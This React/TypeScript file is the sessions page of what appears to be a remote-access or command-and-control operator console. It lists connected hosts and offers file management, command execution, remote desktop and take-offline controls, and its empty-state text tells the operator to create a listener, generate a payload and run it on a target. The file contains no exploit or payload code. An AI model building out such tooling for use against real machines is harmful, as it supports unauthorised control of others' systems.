import { useCallback, useEffect, useRef, useState } from 'react'
import { ReloadOutlined } from '@ant-design/icons'
import { Button, Dropdown, Input, Modal, Popconfirm, Table, Tag, App } from 'antd'
import { useLocation, useNavigate } from 'react-router-dom'
import { api } from '../api'
import { useWs } from '../hooks/useWs'
import Page from '../layout/Page'
import { formatSeen, statusLabel, statusTone } from '../status'
import styles from './console.module.css'

export type SessionRow = {
  id: string
  listener_id: string
  remote_addr: string
  hostname: string
  username: string
  os: string
  arch: string
  pid: number
  ip: string
  remark: string
  last_seen: number
  status: string
}

type Mod = 'cmd' | 'files' | 'desk'

export default function Sessions() {
  const { message } = App.useApp()
  const nav = useNavigate()
  const loc = useLocation()
  const [rows, setRows] = useState<SessionRow[]>([])
  const [q, setQ] = useState('')
  const [sel, setSel] = useState<string>('')
  const [drafts, setDrafts] = useState<Record<string, string>>({})
  const editing = useRef<string | null>(null)
  const ctxRow = useRef<SessionRow | null>(null)

  const load = useCallback(async () => {
    try {
      const data = (await api('/api/sessions')) as SessionRow[]
      setRows(Array.isArray(data) ? data : [])
    } catch (e) {
      message.error(e instanceof Error ? e.message : '加载失败')
    }
  }, [message])

  const [, setTick] = useState(0)
  useEffect(() => {
    void load()
    const t = setInterval(() => void load(), 8000)
    const tick = setInterval(() => setTick((n) => n + 1), 1000)
    return () => {
      clearInterval(t)
      clearInterval(tick)
    }
  }, [load])

  useWs((e) => {
    if (e.kind?.startsWith('session.')) void load()
  })

  const open = (sid: string, mod: Mod = 'files') => {
    const sp = new URLSearchParams(loc.search)
    sp.set('mod', mod)
    nav({ pathname: `/sessions/${sid}`, search: `?${sp.toString()}` })
  }

  const quit = (sid: string) => {
    void api(`/api/sessions/${sid}/quit`, { method: 'POST' })
      .then(() => {
        message.success('已下线')
        void load()
      })
      .catch((err) => message.error(err instanceof Error ? err.message : '下线失败'))
  }

  const saveRemark = (id: string, remark: string) => {
    void api(`/api/sessions/${id}`, { method: 'PATCH', body: JSON.stringify({ remark }) })
      .then(() => {
        setRows((prev) => prev.map((r) => (r.id === id ? { ...r, remark } : r)))
        setDrafts((d) => {
          const n = { ...d }
          delete n[id]
          return n
        })
      })
      .catch((err) => message.error(err instanceof Error ? err.message : '保存失败'))
  }

  const filtered = rows.filter((r) => {
    const s = q.trim().toLowerCase()
    if (!s) return true
    return [r.hostname, r.username, r.remote_addr, r.ip, r.id, r.os, r.remark].join(' ').toLowerCase().includes(s)
  })

  const current = rows.find((r) => r.id === sel) || null

  const menuItems = [
    { key: 'files', label: '文件管理' },
    { key: 'cmd', label: '命令控制' },
    { key: 'desk', label: '远程桌面' },
    { type: 'divider' as const },
    { key: 'quit', label: '下线' },
    { key: 'del', label: '删除', danger: true },
  ]

  return (
    <Page
      title="主机管理"
      extra={
        <>
          <span className={styles.mono}>
            在线 {rows.filter((r) => r.status === 'online').length} / {rows.length}
          </span>
          <Input.Search
            allowClear
            placeholder="搜索主机名、用户或地址"
            style={{ width: 280 }}
            value={q}
            onChange={(e) => setQ(e.target.value)}
          />
          <Button icon={<ReloadOutlined />} onClick={() => void load()}>
            刷新
          </Button>
        </>
      }
    >
      <Dropdown
        trigger={['contextMenu']}
        menu={{
          items: menuItems,
          onClick: ({ key }) => {
            const r = ctxRow.current
            if (!r) return
            if (key === 'quit') quit(r.id)
            else if (key === 'del') {
              Modal.confirm({
                title: '删除主机将同时清除从该主机下载的文件，确认？',
                okText: '删除',
                okButtonProps: { danger: true },
                onOk: () =>
                  api(`/api/sessions/${r.id}`, { method: 'DELETE' })
                    .then(() => {
                      message.success('已删除')
                      void load()
                    })
                    .catch((err) => message.error(err instanceof Error ? err.message : '删除失败')),
              })
            } else open(r.id, key as Mod)
          },
        }}
      >
        <div className={`${styles.card} ${styles.grow} ${current ? styles.sessionSplit : ''}`}>
          <div className={styles.tableCard}>
          <Table
            rowKey="id"
            size="middle"
            pagination={false}
            dataSource={filtered}
            locale={{ emptyText: '还没有主机上线。先创建监听、生成载荷，再在目标上执行。' }}
            rowClassName={(r) => (r.id === sel ? styles.rowCurrent : '')}
            onRow={(r) => ({
              onClick: () => setSel(r.id),
              onDoubleClick: () => open(r.id),
              onContextMenu: () => {
                ctxRow.current = r
                setSel(r.id)
              },
              style: { cursor: 'pointer' },
            })}
            tableLayout="fixed"
            columns={[
              {
                title: '状态',
                dataIndex: 'status',
                width: 72,
                render: (s: string) => <Tag color={statusTone(s)}>{statusLabel(s)}</Tag>,
              },
              { title: '主机名', dataIndex: 'hostname', width: 160, ellipsis: true, render: (v: string, r) => v || r.id },
              {
                title: '备注',
                dataIndex: 'remark',
                width: 140,
                render: (v: string, r: SessionRow) => (
                  <Input
                    size="small"
                    value={drafts[r.id] ?? v ?? ''}
                    placeholder="点击输入"
                    onClick={(e) => e.stopPropagation()}
                    onFocus={() => {
                      editing.current = r.id
                      setDrafts((d) => ({ ...d, [r.id]: d[r.id] ?? v ?? '' }))
                    }}
                    onChange={(e) => setDrafts((d) => ({ ...d, [r.id]: e.target.value }))}
                    onPressEnter={(e) => {
                      e.stopPropagation()
                      editing.current = null
                      saveRemark(r.id, (e.target as HTMLInputElement).value)
                    }}
                    onBlur={(e) => {
                      editing.current = null
                      const remark = e.target.value
                      if (remark === (v || '')) {
                        setDrafts((d) => {
                          const n = { ...d }
                          delete n[r.id]
                          return n
                        })
                        return
                      }
                      saveRemark(r.id, remark)
                    }}
                  />
                ),
              },
              { title: '用户', dataIndex: 'username', width: 110, ellipsis: true, render: (v: string) => v || '—' },
              {
                title: '外网',
                width: 170,
                ellipsis: true,
                render: (_: unknown, r: SessionRow) => (
                  <span className={styles.mono}>{r.remote_addr || '—'}</span>
                ),
              },
              {
                title: '内网',
                width: 130,
                ellipsis: true,
                render: (_: unknown, r: SessionRow) => <span className={styles.mono}>{r.ip || '—'}</span>,
              },
              {
                title: '系统',
                width: 130,
                render: (_: unknown, r: SessionRow) => (
                  <span className={styles.mono}>
                    {r.os || '—'} / {r.arch || '—'}
                  </span>
                ),
              },
              {
                title: 'PID',
                dataIndex: 'pid',
                width: 80,
                render: (v: number) => <span className={styles.mono}>{v || '—'}</span>,
              },
              { title: '心跳', dataIndex: 'last_seen', width: 100, render: (v: number) => formatSeen(v) },
              {
                title: '操作',
                width: 180,
                render: (_: unknown, r: SessionRow) => (
                  <>
                    <Button
                      type="link"
                      size="small"
                      onClick={(e) => {
                        e.stopPropagation()
                        open(r.id)
                      }}
                    >
                      进入
                    </Button>
                    <Popconfirm title="确认下线该主机？" onConfirm={() => quit(r.id)}>
                      <Button
                        type="link"
                        size="small"
                        disabled={r.status !== 'online'}
                        onClick={(e) => e.stopPropagation()}
                      >
                        下线
                      </Button>
                    </Popconfirm>
                    <Popconfirm
                      title="删除主机将同时清除从该主机下载的文件，确认？"
                      onConfirm={() => {
                        void api(`/api/sessions/${r.id}`, { method: 'DELETE' })
                          .then(() => {
                            message.success('已删除')
                            if (sel === r.id) setSel('')
                            void load()
                          })
                          .catch((err) => message.error(err instanceof Error ? err.message : '删除失败'))
                      }}
                    >
                      <Button type="link" size="small" danger onClick={(e) => e.stopPropagation()}>
                        删除
                      </Button>
                    </Popconfirm>
                  </>
                ),
              },
            ]}
          />
          </div>
          {current ? (
            <aside className={styles.sessionSide}>
              <h3>{current.hostname || current.id}</h3>
              <Tag color={statusTone(current.status)}>{statusLabel(current.status)}</Tag>
              <div className={styles.mono}>{current.username || '—'}</div>
              <div className={styles.mono}>{current.os} / {current.arch}</div>
              <div className={styles.mono}>内网 {current.ip || '—'}</div>
              <div className={styles.mono}>外网 {current.remote_addr || '—'}</div>
              <div className={styles.sideActions}>
                <Button block onClick={() => open(current.id, 'files')}>
                  文件管理
                </Button>
                <Button block onClick={() => open(current.id, 'cmd')}>
                  命令控制
                </Button>
                <Button type="primary" block onClick={() => open(current.id, 'desk')}>
                  远程桌面
                </Button>
              </div>
            </aside>
          ) : null}
        </div>
      </Dropdown>
    </Page>
  )
}
